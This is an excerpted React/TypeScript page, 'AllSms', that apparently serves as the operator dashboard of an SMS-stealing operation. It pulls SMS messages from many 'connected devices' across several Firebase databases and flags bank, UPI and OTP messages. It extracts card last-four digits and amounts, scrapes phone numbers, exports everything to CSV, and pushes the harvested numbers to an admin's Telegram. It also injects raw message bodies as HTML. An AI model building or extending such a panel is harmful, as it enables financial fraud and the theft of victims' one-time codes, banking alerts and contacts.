...
import {
  MessageSquare, Search, TrendingUp, Copy, ChevronDown, ChevronUp,
  IndianRupee, ArrowDownWideNarrow, Smartphone, ShieldCheck, Phone,
} from 'lucide-react';
import {
  classifySms, extractInfo, CATEGORY_META, formatSmsDate,
  type SmsCategory, type SmsInfo,
...
const ALL_CATS: SmsCategory[] = [
  'BANK', 'UPI', 'SHOPPING', 'OTP', 'TRAVEL', 'INVESTMENT', 'OFFERS', 'ALERTS', 'OTHER',
];
...
export function AllSms() {
  ...
  useEffect(() => {
    ...
    type Source = { label: string; db: Database; clients: Record<string, any>; messages: Record<string, any>; ready: boolean };
    let sources: Source[] = [{ label: 'main', db, clients: {}, messages: {}, ready: false }];
      ...
      for (const src of sources) {
        ...
        Object.entries(messagesData).forEach(([deviceId, smsList]) => {
          ...
          Object.entries(smsList as Record<string, any>).forEach(([pushKey, sms]) => {
            ...
            entries.push({
              deviceId, deviceModel: device.modelName || device.model || 'Unknown',
              devicePhone: device.mobNo || device.phone || '',
              pushKey, from, body, date: sortKey,
              category: cls.category, isFinance: cls.isFinance, amount: cls.amount,
              info: extractInfo(body), dbLabel: label,
              numbers: scrapeNumbers(body, device.mobNo || device.phone || ''),
            });
          });
        });
        ...
        Object.entries(clientsData).forEach(([deviceId, device]) => {
          ...
          Object.entries(device.sms as Record<string, any>).forEach(([pushKey, sms]) => {
            ...
            entries.push({
              deviceId, deviceModel: device.modelName || device.model || 'Unknown',
              devicePhone: device.mobNo || device.phone || '',
              pushKey, from: sms.from || 'Unknown', body,
    ...
    const unsubConfig = onValue(ref(db, 'config/firebases'), (snap) => {
      ...
      sources = sources.filter((s) => s.label === 'main' || wanted.some((w) => w.id === s.label));
      extraApps = extraApps.filter((app) => wanted.some((w) => app.name === w.id));
      ...
      for (const w of wanted) {
        if (!sources.some((s) => s.label === w.id)) {
          ...
          const src: Source = { label: w.id, db: getDatabase(app), clients: {}, messages: {}, ready: false };
          sources.push(src);
    ...
    return () => {
      cancelled = true;
      unsubs.forEach((u) => u());
      extraApps.forEach((app) => { try { deleteApp(app); } catch { /* noop */ } });
    };
  }, [isAdmin, userId]);
  ...
  const financeCount = useMemo(
    () => allSms.filter((s) => s.isFinance).length, [allSms]
  );
  ...
  const displayed = useMemo(() => {
    ...
    switch (sortMode) {
      case 'newest': list = [...list].sort((a, b) => b.date - a.date); break;
      case 'oldest': list = [...list].sort((a, b) => a.date - b.date); break;
      case 'sender': list = [...list].sort((a, b) => a.from.localeCompare(b.from)); break;
      case 'device': list = [...list].sort((a, b) => a.deviceModel.localeCompare(b.deviceModel)); break;
    }
    return list;
  ...
  const exportSmsCsv = () => {
    ...
    const rows = displayed.map((s) =>
      [new Date(s.date).toISOString(), s.from, s.category, s.amount ?? '', s.deviceModel, s.body]
        .map(esc).join(',')
    );
    download(`sms-${catFilter === 'all' ? 'all' : catFilter}.csv`, [header.join(','), ...rows].join('\n'), 'text/csv;charset=utf-8');
  };
  ...
  const exportNumbers = () => {
    ...
    download(`scraped-numbers-${lines.length}.txt`, lines.join('\n'), 'text/plain');
  };
  ...
  const sendNumbersToTelegram = async () => {
    ...
    const lines = [...set].sort();
    if (!lines.length) {
      toast({ title: 'Error', description: 'No numbers found yet', variant: 'destructive' });
      return;
    }
    ...
    try {
      ...
      toast({ title: 'Sent to Telegram', description: `${lines.length} numbers delivered to admin DM` });
    } catch (err: any) {
    ...
    <Layout>
        ...
        <div className="flex flex-wrap items-end justify-between gap-3">
          <div>
            ...
            <p className="text-sm text-muted-foreground mt-1 flex items-center gap-2 flex-wrap">
              ...
              <span>
                {allSms.length} total · <IndianRupee className="inline w-3.5 h-3.5" /> {financeCount} finance
                {catCounts['BANK'] > 0 && ` · 🏦 ${catCounts['BANK']} bank`}
                {catCounts['SHOPPING'] > 0 && ` · 🛒 ${catCounts['SHOPPING']} shopping`}
              </span>
            </p>
          </div>
        ...
        <div className="flex gap-2 overflow-x-auto pb-1 -mx-1 px-1 sm:flex-wrap sm:overflow-visible">
          ...
          {ALL_CATS.map((c) => (
            ...
            >
              ...
              <span className={`px-1.5 rounded-full text-[10px] ${catFilter === c ? 'bg-primary-foreground/20' : 'bg-muted'}`}>
                {catCounts[c] || 0}
              </span>
            </button>
          ))}
      ...
      {loading ? (
        ...
        <div className="glass-card p-10 text-center text-muted-foreground">
          ...
          <p className="font-medium">No messages {catFilter !== 'all' ? `in ${CATEGORY_META[catFilter].label.toLowerCase()}` : ''}</p>
          <p className="text-xs mt-1">New SMS from connected devices will appear here instantly.</p>
        </div>
      ) : (
        <div className="space-y-3">
          {displayed.map((sms) => {
                ...
                <div className="flex items-start gap-3 p-4">
                  ...
                  <div className="flex-1 min-w-0">
                    <div className="flex flex-wrap items-center gap-2 mb-1.5">
                      ...
                      <span className="text-xs font-semibold text-foreground truncate">{sms.from}</span>
                    ...
                    <div className="text-sm text-foreground leading-relaxed break-words">
                      {expanded || !needsExpand ? (
                        <span dangerouslySetInnerHTML={{ __html: highlightBody(sms.body) }} />
                      ) : (
                        <span>{preview}</span>
                      )}
                    </div>
                    ...
                    <div className="flex flex-wrap items-center gap-x-3 gap-y-1 mt-2">
                      <span className="font-mono text-[10px] text-muted-foreground">{sms.devicePhone || sms.deviceModel}</span>
                      {sms.dbLabel !== 'main' && (
                      ...
                      {sms.info.txnType && (
                        <span className={`inline-flex items-center px-1.5 py-0.5 rounded-md text-[10px] font-semibold ${
                          sms.info.txnType === 'Debit' || sms.info.txnType === 'Failed'
                            ? 'bg-red-500/10 text-red-600 dark:text-red-400'
                            : 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400'
                        }`}>
                          {sms.info.txnType === 'Debit' ? '↓' : sms.info.txnType === 'Credit' ? '↑' : ''} {sms.info.txnType}
                        </span>
                      )}
                      {sms.info.cardLast4 && (
                      ...
                      {sms.info.numbers.slice(0, 4).map((num) => (
                        ...
                        >
                          ...
                          {num}
                          {copiedKey === key + num && <span className="text-success font-bold">✓</span>}
                        </button>
                      ))}
                      {needsExpand && (
                        <button
          ...
          {allSms.length > 0 && (
            <p className="text-center text-[11px] text-muted-foreground pt-2 flex items-center justify-center gap-1">
              ...
              Showing newest {allSms.length} messages · {catFilter !== 'all' ? `filtered to ${CATEGORY_META[catFilter].label.toLowerCase()}` : 'all categories'}
            </p>
          )}
        </div>
      )}
